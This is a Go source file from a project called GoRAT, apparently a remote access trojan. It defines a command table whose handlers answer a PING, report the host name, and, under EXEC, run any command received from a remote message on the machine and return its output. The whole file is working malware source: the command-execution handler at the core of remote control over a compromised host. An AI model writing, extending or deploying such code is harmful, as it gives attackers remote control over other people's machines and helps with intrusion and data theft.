// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package commands

import (
	"os"
	"os/exec"
	"strings"
	"time"
)

var commands = []*command{
	&command{
		Identifier: "PING",
		Function: func(message []byte) []byte {
			return []byte(time.Now().String())
		},
	},
	&command{
		Identifier: "HOSTNAME",
		Function: func(message []byte) []byte {
			// Get the OS hostname
			hostname, err := os.Hostname()
			if err != nil {
				return []byte(err.Error())
			}

			return []byte(hostname)
		},
	},
	&command{
		Identifier: "EXEC",
		Function: func(message []byte) []byte {
			splitted := strings.Split(string(message), " ")
			cmdName := splitted[1]
			args := splitted[2:]

			// Run the cmd, unwrapping the args array
			out, err := exec.Command(cmdName, args...).Output()
			if err != nil {
				return []byte(err.Error())
			}

			return out
		},
	},
}
